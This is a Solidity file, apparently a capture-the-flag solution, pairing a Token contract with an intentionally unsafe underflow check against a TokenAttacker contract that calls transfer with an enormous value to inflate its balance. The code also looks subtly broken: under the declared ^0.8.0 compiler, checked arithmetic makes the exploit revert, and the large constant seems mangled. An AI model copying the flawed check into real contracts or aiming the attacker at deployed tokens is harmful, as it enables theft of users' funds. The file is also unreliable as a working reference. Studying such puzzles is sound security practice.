// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply)  {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}



contract TokenAttacker{
    function attack(address tokenContractAddress)external {
        Token target=Token(tokenContractAddress);
        target.transfer(msg.sender,1);
        target.transfer(msg.sender,11579208923731619542357098500868790785326998466564056403945758400791312963991);
        // target.transfer(msg.sender,1);
        

    }
}
